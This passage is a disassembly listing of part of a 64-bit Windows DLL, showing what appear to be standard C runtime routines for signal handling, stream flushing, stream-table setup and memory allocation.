   180009158:	48 8b 0d 71 71 00 00 	mov    0x7171(%rip),%rcx        # 0x1800102d0
   18000915f:	48 c1 e1 04          	shl    $0x4,%rcx
   180009163:	48 03 c8             	add    %rax,%rcx
   180009166:	eb 09                	jmp    0x180009171
   180009168:	39 58 04             	cmp    %ebx,0x4(%rax)
   18000916b:	74 0b                	je     0x180009178
   18000916d:	48 83 c0 10          	add    $0x10,%rax
   180009171:	48 3b c1             	cmp    %rcx,%rax
   180009174:	75 f2                	jne    0x180009168
   180009176:	33 c0                	xor    %eax,%eax
   180009178:	48 85 c0             	test   %rax,%rax
   18000917b:	75 12                	jne    0x18000918f
   18000917d:	e8 72 cf ff ff       	call   0x1800060f4
   180009182:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   180009188:	e8 bf cd ff ff       	call   0x180005f4c
   18000918d:	eb a9                	jmp    0x180009138
   18000918f:	48 8d 78 08          	lea    0x8(%rax),%rdi
   180009193:	45 32 f6             	xor    %r14b,%r14b
   180009196:	44 88 74 24 70       	mov    %r14b,0x70(%rsp)
   18000919b:	eb 22                	jmp    0x1800091bf
   18000919d:	48 8d 3d 4c 23 01 00 	lea    0x1234c(%rip),%rdi        # 0x18001b4f0
   1800091a4:	eb 19                	jmp    0x1800091bf
   1800091a6:	48 8d 3d 3b 23 01 00 	lea    0x1233b(%rip),%rdi        # 0x18001b4e8
   1800091ad:	eb 10                	jmp    0x1800091bf
   1800091af:	48 8d 3d 42 23 01 00 	lea    0x12342(%rip),%rdi        # 0x18001b4f8
   1800091b6:	eb 07                	jmp    0x1800091bf
   1800091b8:	48 8d 3d 21 23 01 00 	lea    0x12321(%rip),%rdi        # 0x18001b4e0
   1800091bf:	45 33 ed             	xor    %r13d,%r13d
   1800091c2:	45 84 f6             	test   %r14b,%r14b
   1800091c5:	74 0a                	je     0x1800091d1
   1800091c7:	41 8d 4d 03          	lea    0x3(%r13),%ecx
   1800091cb:	e8 48 d7 ff ff       	call   0x180006918
   1800091d0:	90                   	nop
   1800091d1:	48 8b 37             	mov    (%rdi),%rsi
   1800091d4:	45 84 f6             	test   %r14b,%r14b
   1800091d7:	74 12                	je     0x1800091eb
   1800091d9:	48 8b 05 20 0e 01 00 	mov    0x10e20(%rip),%rax        # 0x18001a000
   1800091e0:	8b c8                	mov    %eax,%ecx
   1800091e2:	83 e1 3f             	and    $0x3f,%ecx
   1800091e5:	48 33 f0             	xor    %rax,%rsi
   1800091e8:	48 d3 ce             	ror    %cl,%rsi
   1800091eb:	48 83 fe 01          	cmp    $0x1,%rsi
   1800091ef:	0f 84 8b 00 00 00    	je     0x180009280
   1800091f5:	48 85 f6             	test   %rsi,%rsi
   1800091f8:	0f 84 e9 00 00 00    	je     0x1800092e7
   1800091fe:	41 bc 10 09 00 00    	mov    $0x910,%r12d
   180009204:	83 fb 0b             	cmp    $0xb,%ebx
   180009207:	77 35                	ja     0x18000923e
   180009209:	41 0f a3 dc          	bt     %ebx,%r12d
   18000920d:	73 2f                	jae    0x18000923e
   18000920f:	4d 8b 6f 08          	mov    0x8(%r15),%r13
   180009213:	4c 89 6c 24 30       	mov    %r13,0x30(%rsp)
   180009218:	49 83 67 08 00       	andq   $0x0,0x8(%r15)
   18000921d:	83 fb 08             	cmp    $0x8,%ebx
   180009220:	75 52                	jne    0x180009274
   180009222:	e8 71 d3 ff ff       	call   0x180006598
   180009227:	8b 40 10             	mov    0x10(%rax),%eax
   18000922a:	89 44 24 78          	mov    %eax,0x78(%rsp)
   18000922e:	89 44 24 20          	mov    %eax,0x20(%rsp)
   180009232:	e8 61 d3 ff ff       	call   0x180006598
   180009237:	c7 40 10 8c 00 00 00 	movl   $0x8c,0x10(%rax)
   18000923e:	83 fb 08             	cmp    $0x8,%ebx
   180009241:	75 31                	jne    0x180009274
   180009243:	48 8b 05 8e 70 00 00 	mov    0x708e(%rip),%rax        # 0x1800102d8
   18000924a:	48 c1 e0 04          	shl    $0x4,%rax
   18000924e:	49 03 07             	add    (%r15),%rax
   180009251:	48 8b 0d 88 70 00 00 	mov    0x7088(%rip),%rcx        # 0x1800102e0
   180009258:	48 c1 e1 04          	shl    $0x4,%rcx
   18000925c:	48 03 c8             	add    %rax,%rcx
   18000925f:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   180009264:	48 3b c1             	cmp    %rcx,%rax
   180009267:	74 1d                	je     0x180009286
   180009269:	48 83 60 08 00       	andq   $0x0,0x8(%rax)
   18000926e:	48 83 c0 10          	add    $0x10,%rax
   180009272:	eb eb                	jmp    0x18000925f
   180009274:	48 8b 05 85 0d 01 00 	mov    0x10d85(%rip),%rax        # 0x18001a000
   18000927b:	48 89 07             	mov    %rax,(%rdi)
   18000927e:	eb 06                	jmp    0x180009286
   180009280:	41 bc 10 09 00 00    	mov    $0x910,%r12d
   180009286:	45 84 f6             	test   %r14b,%r14b
   180009289:	74 0a                	je     0x180009295
   18000928b:	b9 03 00 00 00       	mov    $0x3,%ecx
   180009290:	e8 d7 d6 ff ff       	call   0x18000696c
   180009295:	48 83 fe 01          	cmp    $0x1,%rsi
   180009299:	75 07                	jne    0x1800092a2
   18000929b:	33 c0                	xor    %eax,%eax
   18000929d:	e9 99 fe ff ff       	jmp    0x18000913b
   1800092a2:	83 fb 08             	cmp    $0x8,%ebx
   1800092a5:	75 14                	jne    0x1800092bb
   1800092a7:	e8 ec d2 ff ff       	call   0x180006598
   1800092ac:	8b 50 10             	mov    0x10(%rax),%edx
   1800092af:	8b cb                	mov    %ebx,%ecx
   1800092b1:	48 8b c6             	mov    %rsi,%rax
   1800092b4:	e8 77 3f 00 00       	call   0x18000d230
   1800092b9:	eb 0a                	jmp    0x1800092c5
   1800092bb:	8b cb                	mov    %ebx,%ecx
   1800092bd:	48 8b c6             	mov    %rsi,%rax
   1800092c0:	e8 6b 3f 00 00       	call   0x18000d230
   1800092c5:	83 fb 0b             	cmp    $0xb,%ebx
   1800092c8:	77 d1                	ja     0x18000929b
   1800092ca:	41 0f a3 dc          	bt     %ebx,%r12d
   1800092ce:	73 cb                	jae    0x18000929b
   1800092d0:	4d 89 6f 08          	mov    %r13,0x8(%r15)
   1800092d4:	83 fb 08             	cmp    $0x8,%ebx
   1800092d7:	75 c2                	jne    0x18000929b
   1800092d9:	e8 ba d2 ff ff       	call   0x180006598
   1800092de:	8b 4c 24 78          	mov    0x78(%rsp),%ecx
   1800092e2:	89 48 10             	mov    %ecx,0x10(%rax)
   1800092e5:	eb b4                	jmp    0x18000929b
   1800092e7:	45 84 f6             	test   %r14b,%r14b
   1800092ea:	74 08                	je     0x1800092f4
   1800092ec:	8d 4e 03             	lea    0x3(%rsi),%ecx
   1800092ef:	e8 78 d6 ff ff       	call   0x18000696c
   1800092f4:	b9 03 00 00 00       	mov    $0x3,%ecx
   1800092f9:	e8 3e bd ff ff       	call   0x18000503c
   1800092fe:	90                   	nop
   1800092ff:	cc                   	int3
   180009300:	48 89 0d f9 21 01 00 	mov    %rcx,0x121f9(%rip)        # 0x18001b500
   180009307:	c3                   	ret
   180009308:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   18000930d:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   180009312:	57                   	push   %rdi
   180009313:	48 83 ec 20          	sub    $0x20,%rsp
   180009317:	49 8b f9             	mov    %r9,%rdi
   18000931a:	49 8b d8             	mov    %r8,%rbx
   18000931d:	48 8b 0a             	mov    (%rdx),%rcx
   180009320:	e8 a7 04 00 00       	call   0x1800097cc
   180009325:	90                   	nop
   180009326:	48 8b 53 08          	mov    0x8(%rbx),%rdx
   18000932a:	48 8b 03             	mov    (%rbx),%rax
   18000932d:	48 8b 08             	mov    (%rax),%rcx
   180009330:	48 85 c9             	test   %rcx,%rcx
   180009333:	74 5c                	je     0x180009391
   180009335:	8b 49 14             	mov    0x14(%rcx),%ecx
   180009338:	90                   	nop
   180009339:	8b c1                	mov    %ecx,%eax
   18000933b:	c1 e8 0d             	shr    $0xd,%eax
   18000933e:	a8 01                	test   $0x1,%al
   180009340:	74 4f                	je     0x180009391
   180009342:	8b c1                	mov    %ecx,%eax
   180009344:	24 03                	and    $0x3,%al
   180009346:	3c 02                	cmp    $0x2,%al
   180009348:	75 05                	jne    0x18000934f
   18000934a:	f6 c1 c0             	test   $0xc0,%cl
   18000934d:	75 0a                	jne    0x180009359
   18000934f:	0f ba e1 0b          	bt     $0xb,%ecx
   180009353:	72 04                	jb     0x180009359
   180009355:	ff 02                	incl   (%rdx)
   180009357:	eb 38                	jmp    0x180009391
   180009359:	48 8b 43 10          	mov    0x10(%rbx),%rax
   18000935d:	80 38 00             	cmpb   $0x0,(%rax)
   180009360:	75 10                	jne    0x180009372
   180009362:	48 8b 03             	mov    (%rbx),%rax
   180009365:	48 8b 08             	mov    (%rax),%rcx
   180009368:	8b 41 14             	mov    0x14(%rcx),%eax
   18000936b:	90                   	nop
   18000936c:	d1 e8                	shr    $1,%eax
   18000936e:	a8 01                	test   $0x1,%al
   180009370:	74 1f                	je     0x180009391
   180009372:	48 8b 0b             	mov    (%rbx),%rcx
   180009375:	48 8b 09             	mov    (%rcx),%rcx
   180009378:	e8 f7 01 00 00       	call   0x180009574
   18000937d:	83 f8 ff             	cmp    $0xffffffff,%eax
   180009380:	74 08                	je     0x18000938a
   180009382:	48 8b 43 08          	mov    0x8(%rbx),%rax
   180009386:	ff 00                	incl   (%rax)
   180009388:	eb 07                	jmp    0x180009391
   18000938a:	48 8b 43 18          	mov    0x18(%rbx),%rax
   18000938e:	83 08 ff             	orl    $0xffffffff,(%rax)
   180009391:	48 8b 0f             	mov    (%rdi),%rcx
   180009394:	e8 3f 04 00 00       	call   0x1800097d8
   180009399:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   18000939e:	48 83 c4 20          	add    $0x20,%rsp
   1800093a2:	5f                   	pop    %rdi
   1800093a3:	c3                   	ret
   1800093a4:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1800093a9:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   1800093ae:	56                   	push   %rsi
   1800093af:	57                   	push   %rdi
   1800093b0:	41 56                	push   %r14
   1800093b2:	48 83 ec 60          	sub    $0x60,%rsp
   1800093b6:	49 8b f9             	mov    %r9,%rdi
   1800093b9:	49 8b f0             	mov    %r8,%rsi
   1800093bc:	8b 0a                	mov    (%rdx),%ecx
   1800093be:	e8 55 d5 ff ff       	call   0x180006918
   1800093c3:	90                   	nop
   1800093c4:	48 8b 1d 45 21 01 00 	mov    0x12145(%rip),%rbx        # 0x18001b510
   1800093cb:	48 63 05 36 21 01 00 	movslq 0x12136(%rip),%rax        # 0x18001b508
   1800093d2:	4c 8d 34 c3          	lea    (%rbx,%rax,8),%r14
   1800093d6:	48 89 5c 24 38       	mov    %rbx,0x38(%rsp)
   1800093db:	49 3b de             	cmp    %r14,%rbx
   1800093de:	0f 84 89 00 00 00    	je     0x18000946d
   1800093e4:	48 8b 0b             	mov    (%rbx),%rcx
   1800093e7:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   1800093ec:	48 8b 16             	mov    (%rsi),%rdx
   1800093ef:	48 85 c9             	test   %rcx,%rcx
   1800093f2:	74 22                	je     0x180009416
   1800093f4:	8b 49 14             	mov    0x14(%rcx),%ecx
   1800093f7:	90                   	nop
   1800093f8:	8b c1                	mov    %ecx,%eax
   1800093fa:	c1 e8 0d             	shr    $0xd,%eax
   1800093fd:	a8 01                	test   $0x1,%al
   1800093ff:	74 15                	je     0x180009416
   180009401:	8b c1                	mov    %ecx,%eax
   180009403:	24 03                	and    $0x3,%al
   180009405:	3c 02                	cmp    $0x2,%al
   180009407:	75 05                	jne    0x18000940e
   180009409:	f6 c1 c0             	test   $0xc0,%cl
   18000940c:	75 0e                	jne    0x18000941c
   18000940e:	0f ba e1 0b          	bt     $0xb,%ecx
   180009412:	72 08                	jb     0x18000941c
   180009414:	ff 02                	incl   (%rdx)
   180009416:	48 83 c3 08          	add    $0x8,%rbx
   18000941a:	eb ba                	jmp    0x1800093d6
   18000941c:	48 8b 56 10          	mov    0x10(%rsi),%rdx
   180009420:	48 8b 4e 08          	mov    0x8(%rsi),%rcx
   180009424:	48 8b 06             	mov    (%rsi),%rax
   180009427:	4c 8d 44 24 20       	lea    0x20(%rsp),%r8
   18000942c:	4c 89 44 24 40       	mov    %r8,0x40(%rsp)
   180009431:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   180009436:	48 89 4c 24 50       	mov    %rcx,0x50(%rsp)
   18000943b:	48 89 54 24 58       	mov    %rdx,0x58(%rsp)
   180009440:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   180009445:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   18000944a:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   18000944f:	4c 8d 4c 24 28       	lea    0x28(%rsp),%r9
   180009454:	4c 8d 44 24 40       	lea    0x40(%rsp),%r8
   180009459:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   18000945e:	48 8d 8c 24 88 00 00 	lea    0x88(%rsp),%rcx
   180009465:	00 
   180009466:	e8 9d fe ff ff       	call   0x180009308
   18000946b:	eb a9                	jmp    0x180009416
   18000946d:	8b 0f                	mov    (%rdi),%ecx
   18000946f:	e8 f8 d4 ff ff       	call   0x18000696c
   180009474:	48 8b 9c 24 80 00 00 	mov    0x80(%rsp),%rbx
   18000947b:	00 
   18000947c:	48 83 c4 60          	add    $0x60,%rsp
   180009480:	41 5e                	pop    %r14
   180009482:	5f                   	pop    %rdi
   180009483:	5e                   	pop    %rsi
   180009484:	c3                   	ret
   180009485:	cc                   	int3
   180009486:	cc                   	int3
   180009487:	cc                   	int3
   180009488:	88 4c 24 08          	mov    %cl,0x8(%rsp)
   18000948c:	55                   	push   %rbp
   18000948d:	48 8b ec             	mov    %rsp,%rbp
   180009490:	48 83 ec 40          	sub    $0x40,%rsp
   180009494:	83 65 28 00          	andl   $0x0,0x28(%rbp)
   180009498:	48 8d 45 28          	lea    0x28(%rbp),%rax
   18000949c:	83 65 20 00          	andl   $0x0,0x20(%rbp)
   1800094a0:	4c 8d 4d e0          	lea    -0x20(%rbp),%r9
   1800094a4:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
   1800094a8:	4c 8d 45 e8          	lea    -0x18(%rbp),%r8
   1800094ac:	48 8d 45 10          	lea    0x10(%rbp),%rax
   1800094b0:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   1800094b4:	48 8d 55 e4          	lea    -0x1c(%rbp),%rdx
   1800094b8:	48 8d 45 20          	lea    0x20(%rbp),%rax
   1800094bc:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   1800094c0:	48 8d 4d 18          	lea    0x18(%rbp),%rcx
   1800094c4:	b8 08 00 00 00       	mov    $0x8,%eax
   1800094c9:	89 45 e0             	mov    %eax,-0x20(%rbp)
   1800094cc:	89 45 e4             	mov    %eax,-0x1c(%rbp)
   1800094cf:	e8 d0 fe ff ff       	call   0x1800093a4
   1800094d4:	80 7d 10 00          	cmpb   $0x0,0x10(%rbp)
   1800094d8:	8b 45 20             	mov    0x20(%rbp),%eax
   1800094db:	0f 45 45 28          	cmovne 0x28(%rbp),%eax
   1800094df:	48 83 c4 40          	add    $0x40,%rsp
   1800094e3:	5d                   	pop    %rbp
   1800094e4:	c3                   	ret
   1800094e5:	cc                   	int3
   1800094e6:	cc                   	int3
   1800094e7:	cc                   	int3
   1800094e8:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1800094ed:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   1800094f2:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   1800094f7:	57                   	push   %rdi
   1800094f8:	48 83 ec 20          	sub    $0x20,%rsp
   1800094fc:	48 8b d9             	mov    %rcx,%rbx
   1800094ff:	48 8b ea             	mov    %rdx,%rbp
   180009502:	8b 49 14             	mov    0x14(%rcx),%ecx
   180009505:	8b c1                	mov    %ecx,%eax
   180009507:	24 03                	and    $0x3,%al
   180009509:	90                   	nop
   18000950a:	3c 02                	cmp    $0x2,%al
   18000950c:	75 4f                	jne    0x18000955d
   18000950e:	f6 c1 c0             	test   $0xc0,%cl
   180009511:	74 4a                	je     0x18000955d
   180009513:	8b 3b                	mov    (%rbx),%edi
   180009515:	2b 7b 08             	sub    0x8(%rbx),%edi
   180009518:	83 63 10 00          	andl   $0x0,0x10(%rbx)
   18000951c:	48 8b 73 08          	mov    0x8(%rbx),%rsi
   180009520:	48 89 33             	mov    %rsi,(%rbx)
   180009523:	85 ff                	test   %edi,%edi
   180009525:	7e 36                	jle    0x18000955d
   180009527:	48 8b cb             	mov    %rbx,%rcx
   18000952a:	e8 91 08 00 00       	call   0x180009dc0
   18000952f:	4c 8b cd             	mov    %rbp,%r9
   180009532:	44 8b c7             	mov    %edi,%r8d
   180009535:	48 8b d6             	mov    %rsi,%rdx
   180009538:	8b c8                	mov    %eax,%ecx
   18000953a:	e8 15 2d 00 00       	call   0x18000c254
   18000953f:	3b f8                	cmp    %eax,%edi
   180009541:	74 0a                	je     0x18000954d
   180009543:	f0 83 4b 14 10       	lock orl $0x10,0x14(%rbx)
   180009548:	83 c8 ff             	or     $0xffffffff,%eax
   18000954b:	eb 12                	jmp    0x18000955f
   18000954d:	8b 43 14             	mov    0x14(%rbx),%eax
   180009550:	90                   	nop
   180009551:	c1 e8 02             	shr    $0x2,%eax
   180009554:	a8 01                	test   $0x1,%al
   180009556:	74 05                	je     0x18000955d
   180009558:	f0 83 63 14 fd       	lock andl $0xfffffffd,0x14(%rbx)
   18000955d:	33 c0                	xor    %eax,%eax
   18000955f:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180009564:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   180009569:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   18000956e:	48 83 c4 20          	add    $0x20,%rsp
   180009572:	5f                   	pop    %rdi
   180009573:	c3                   	ret
   180009574:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180009579:	48 89 7c 24 10       	mov    %rdi,0x10(%rsp)
   18000957e:	55                   	push   %rbp
   18000957f:	48 8b ec             	mov    %rsp,%rbp
   180009582:	48 83 ec 60          	sub    $0x60,%rsp
   180009586:	48 83 65 c0 00       	andq   $0x0,-0x40(%rbp)
   18000958b:	48 8b d9             	mov    %rcx,%rbx
   18000958e:	83 3d bf 17 01 00 00 	cmpl   $0x0,0x117bf(%rip)        # 0x18001ad54
   180009595:	c6 45 d0 00          	movb   $0x0,-0x30(%rbp)
   180009599:	c6 45 e8 00          	movb   $0x0,-0x18(%rbp)
   18000959d:	c6 45 f0 00          	movb   $0x0,-0x10(%rbp)
   1800095a1:	c6 45 f8 00          	movb   $0x0,-0x8(%rbp)
   1800095a5:	75 10                	jne    0x1800095b7
   1800095a7:	0f 10 05 4a 0c 01 00 	movups 0x10c4a(%rip),%xmm0        # 0x18001a1f8
   1800095ae:	c6 45 e8 01          	movb   $0x1,-0x18(%rbp)
   1800095b2:	f3 0f 7f 45 d8       	movdqu %xmm0,-0x28(%rbp)
   1800095b7:	48 85 db             	test   %rbx,%rbx
   1800095ba:	75 0b                	jne    0x1800095c7
   1800095bc:	33 c9                	xor    %ecx,%ecx
   1800095be:	e8 c5 fe ff ff       	call   0x180009488
   1800095c3:	8b f8                	mov    %eax,%edi
   1800095c5:	eb 32                	jmp    0x1800095f9
   1800095c7:	48 8d 55 c0          	lea    -0x40(%rbp),%rdx
   1800095cb:	e8 18 ff ff ff       	call   0x1800094e8
   1800095d0:	85 c0                	test   %eax,%eax
   1800095d2:	74 05                	je     0x1800095d9
   1800095d4:	83 cf ff             	or     $0xffffffff,%edi
   1800095d7:	eb 20                	jmp    0x1800095f9
   1800095d9:	8b 43 14             	mov    0x14(%rbx),%eax
   1800095dc:	90                   	nop
   1800095dd:	c1 e8 0b             	shr    $0xb,%eax
   1800095e0:	a8 01                	test   $0x1,%al
   1800095e2:	74 13                	je     0x1800095f7
   1800095e4:	48 8b cb             	mov    %rbx,%rcx
   1800095e7:	e8 d4 07 00 00       	call   0x180009dc0
   1800095ec:	8b c8                	mov    %eax,%ecx
   1800095ee:	e8 a1 23 00 00       	call   0x18000b994
   1800095f3:	85 c0                	test   %eax,%eax
   1800095f5:	75 dd                	jne    0x1800095d4
   1800095f7:	33 ff                	xor    %edi,%edi
   1800095f9:	80 7d e8 02          	cmpb   $0x2,-0x18(%rbp)
   1800095fd:	75 0b                	jne    0x18000960a
   1800095ff:	48 8b 45 c0          	mov    -0x40(%rbp),%rax
   180009603:	83 a0 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rax)
   18000960a:	80 7d f0 00          	cmpb   $0x0,-0x10(%rbp)
   18000960e:	74 0f                	je     0x18000961f
   180009610:	8b 5d ec             	mov    -0x14(%rbp),%ebx
   180009613:	48 8d 4d c0          	lea    -0x40(%rbp),%rcx
   180009617:	e8 b4 c4 ff ff       	call   0x180005ad0
   18000961c:	89 58 20             	mov    %ebx,0x20(%rax)
   18000961f:	80 7d f8 00          	cmpb   $0x0,-0x8(%rbp)
   180009623:	74 0f                	je     0x180009634
   180009625:	8b 5d f4             	mov    -0xc(%rbp),%ebx
   180009628:	48 8d 4d c0          	lea    -0x40(%rbp),%rcx
   18000962c:	e8 9f c4 ff ff       	call   0x180005ad0
   180009631:	89 58 24             	mov    %ebx,0x24(%rax)
   180009634:	48 8b 5c 24 70       	mov    0x70(%rsp),%rbx
   180009639:	8b c7                	mov    %edi,%eax
   18000963b:	48 8b 7c 24 78       	mov    0x78(%rsp),%rdi
   180009640:	48 83 c4 60          	add    $0x60,%rsp
   180009644:	5d                   	pop    %rbp
   180009645:	c3                   	ret
   180009646:	cc                   	int3
   180009647:	cc                   	int3
   180009648:	b1 01                	mov    $0x1,%cl
   18000964a:	e9 39 fe ff ff       	jmp    0x180009488
   18000964f:	cc                   	int3
   180009650:	48 8b c4             	mov    %rsp,%rax
   180009653:	48 89 58 08          	mov    %rbx,0x8(%rax)
   180009657:	48 89 68 10          	mov    %rbp,0x10(%rax)
   18000965b:	48 89 70 18          	mov    %rsi,0x18(%rax)
   18000965f:	48 89 78 20          	mov    %rdi,0x20(%rax)
   180009663:	41 56                	push   %r14
   180009665:	48 83 ec 20          	sub    $0x20,%rsp
   180009669:	8b 05 99 1e 01 00    	mov    0x11e99(%rip),%eax        # 0x18001b508
   18000966f:	33 db                	xor    %ebx,%ebx
   180009671:	bf 03 00 00 00       	mov    $0x3,%edi
   180009676:	85 c0                	test   %eax,%eax
   180009678:	75 07                	jne    0x180009681
   18000967a:	b8 00 02 00 00       	mov    $0x200,%eax
   18000967f:	eb 06                	jmp    0x180009687
   180009681:	3b c7                	cmp    %edi,%eax
   180009683:	7d 08                	jge    0x18000968d
   180009685:	8b c7                	mov    %edi,%eax
   180009687:	89 05 7b 1e 01 00    	mov    %eax,0x11e7b(%rip)        # 0x18001b508
   18000968d:	48 63 c8             	movslq %eax,%rcx
   180009690:	ba 08 00 00 00       	mov    $0x8,%edx
   180009695:	e8 56 d3 ff ff       	call   0x1800069f0
   18000969a:	33 c9                	xor    %ecx,%ecx
   18000969c:	48 89 05 6d 1e 01 00 	mov    %rax,0x11e6d(%rip)        # 0x18001b510
   1800096a3:	e8 c8 d3 ff ff       	call   0x180006a70
   1800096a8:	48 39 1d 61 1e 01 00 	cmp    %rbx,0x11e61(%rip)        # 0x18001b510
   1800096af:	75 2f                	jne    0x1800096e0
   1800096b1:	ba 08 00 00 00       	mov    $0x8,%edx
   1800096b6:	89 3d 4c 1e 01 00    	mov    %edi,0x11e4c(%rip)        # 0x18001b508
   1800096bc:	48 8b cf             	mov    %rdi,%rcx
   1800096bf:	e8 2c d3 ff ff       	call   0x1800069f0
   1800096c4:	33 c9                	xor    %ecx,%ecx
   1800096c6:	48 89 05 43 1e 01 00 	mov    %rax,0x11e43(%rip)        # 0x18001b510
   1800096cd:	e8 9e d3 ff ff       	call   0x180006a70
   1800096d2:	48 39 1d 37 1e 01 00 	cmp    %rbx,0x11e37(%rip)        # 0x18001b510
   1800096d9:	75 05                	jne    0x1800096e0
   1800096db:	83 c8 ff             	or     $0xffffffff,%eax
   1800096de:	eb 75                	jmp    0x180009755
   1800096e0:	48 8b eb             	mov    %rbx,%rbp
   1800096e3:	48 8d 35 7e 10 01 00 	lea    0x1107e(%rip),%rsi        # 0x18001a768
   1800096ea:	4c 8d 35 5f 10 01 00 	lea    0x1105f(%rip),%r14        # 0x18001a750
   1800096f1:	49 8d 4e 30          	lea    0x30(%r14),%rcx
   1800096f5:	45 33 c0             	xor    %r8d,%r8d
   1800096f8:	ba a0 0f 00 00       	mov    $0xfa0,%edx
   1800096fd:	e8 3e f2 ff ff       	call   0x180008940
   180009702:	48 8b 05 07 1e 01 00 	mov    0x11e07(%rip),%rax        # 0x18001b510
   180009709:	4c 8d 05 c0 19 01 00 	lea    0x119c0(%rip),%r8        # 0x18001b0d0
   180009710:	48 8b d5             	mov    %rbp,%rdx
   180009713:	48 c1 fa 06          	sar    $0x6,%rdx
   180009717:	4c 89 34 03          	mov    %r14,(%rbx,%rax,1)
   18000971b:	48 8b c5             	mov    %rbp,%rax
   18000971e:	83 e0 3f             	and    $0x3f,%eax
   180009721:	48 8d 0c c0          	lea    (%rax,%rax,8),%rcx
   180009725:	49 8b 04 d0          	mov    (%r8,%rdx,8),%rax
   180009729:	48 8b 4c c8 28       	mov    0x28(%rax,%rcx,8),%rcx
   18000972e:	48 83 c1 02          	add    $0x2,%rcx
   180009732:	48 83 f9 02          	cmp    $0x2,%rcx
   180009736:	77 06                	ja     0x18000973e
   180009738:	c7 06 fe ff ff ff    	movl   $0xfffffffe,(%rsi)
   18000973e:	48 ff c5             	inc    %rbp
   180009741:	49 83 c6 58          	add    $0x58,%r14
   180009745:	48 83 c3 08          	add    $0x8,%rbx
   180009749:	48 83 c6 58          	add    $0x58,%rsi
   18000974d:	48 83 ef 01          	sub    $0x1,%rdi
   180009751:	75 9e                	jne    0x1800096f1
   180009753:	33 c0                	xor    %eax,%eax
   180009755:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   18000975a:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   18000975f:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   180009764:	48 8b 7c 24 48       	mov    0x48(%rsp),%rdi
   180009769:	48 83 c4 20          	add    $0x20,%rsp
   18000976d:	41 5e                	pop    %r14
   18000976f:	c3                   	ret
   180009770:	40 53                	rex push %rbx
   180009772:	48 83 ec 20          	sub    $0x20,%rsp
   180009776:	e8 cd fe ff ff       	call   0x180009648
   18000977b:	e8 24 2f 00 00       	call   0x18000c6a4
   180009780:	33 db                	xor    %ebx,%ebx
   180009782:	48 8b 0d 87 1d 01 00 	mov    0x11d87(%rip),%rcx        # 0x18001b510
   180009789:	48 8b 0c 0b          	mov    (%rbx,%rcx,1),%rcx
   18000978d:	e8 c6 2f 00 00       	call   0x18000c758
   180009792:	48 8b 05 77 1d 01 00 	mov    0x11d77(%rip),%rax        # 0x18001b510
   180009799:	48 8b 0c 03          	mov    (%rbx,%rax,1),%rcx
   18000979d:	48 83 c1 30          	add    $0x30,%rcx
   1800097a1:	ff 15 11 59 00 00    	call   *0x5911(%rip)        # 0x18000f0b8
   1800097a7:	48 83 c3 08          	add    $0x8,%rbx
   1800097ab:	48 83 fb 18          	cmp    $0x18,%rbx
   1800097af:	75 d1                	jne    0x180009782
   1800097b1:	48 8b 0d 58 1d 01 00 	mov    0x11d58(%rip),%rcx        # 0x18001b510
   1800097b8:	e8 b3 d2 ff ff       	call   0x180006a70
   1800097bd:	48 83 25 4b 1d 01 00 	andq   $0x0,0x11d4b(%rip)        # 0x18001b510
   1800097c4:	00 
   1800097c5:	48 83 c4 20          	add    $0x20,%rsp
   1800097c9:	5b                   	pop    %rbx
   1800097ca:	c3                   	ret
   1800097cb:	cc                   	int3
   1800097cc:	48 83 c1 30          	add    $0x30,%rcx
   1800097d0:	48 ff 25 c9 58 00 00 	rex.W jmp *0x58c9(%rip)        # 0x18000f0a0
   1800097d7:	cc                   	int3
   1800097d8:	48 83 c1 30          	add    $0x30,%rcx
   1800097dc:	48 ff 25 c5 58 00 00 	rex.W jmp *0x58c5(%rip)        # 0x18000f0a8
   1800097e3:	cc                   	int3
   1800097e4:	cc                   	int3
   1800097e5:	cc                   	int3
   1800097e6:	cc                   	int3
   1800097e7:	cc                   	int3
   1800097e8:	cc                   	int3
   1800097e9:	cc                   	int3
   1800097ea:	cc                   	int3
   1800097eb:	cc                   	int3
   1800097ec:	cc                   	int3
   1800097ed:	cc                   	int3
   1800097ee:	cc                   	int3
   1800097ef:	cc                   	int3
   1800097f0:	40 53                	rex push %rbx
   1800097f2:	48 83 ec 20          	sub    $0x20,%rsp
   1800097f6:	48 8b d9             	mov    %rcx,%rbx
   1800097f9:	48 83 f9 e0          	cmp    $0xffffffffffffffe0,%rcx
   1800097fd:	77 3c                	ja     0x18000983b
   1800097ff:	48 85 c9             	test   %rcx,%rcx
   180009802:	b8 01 00 00 00       	mov    $0x1,%eax
   180009807:	48 0f 44 d8          	cmove  %rax,%rbx
   18000980b:	eb 15                	jmp    0x180009822
   18000980d:	e8 6e 0e 00 00       	call   0x18000a680
   180009812:	85 c0                	test   %eax,%eax
   180009814:	74 25                	je     0x18000983b
   180009816:	48 8b cb             	mov    %rbx,%rcx
   180009819:	e8 f2 f6 ff ff       	call   0x180008f10
   18000981e:	85 c0                	test   %eax,%eax
   180009820:	74 19                	je     0x18000983b
   180009822:	48 8b 0d 9f 18 01 00 	mov    0x1189f(%rip),%rcx        # 0x18001b0c8
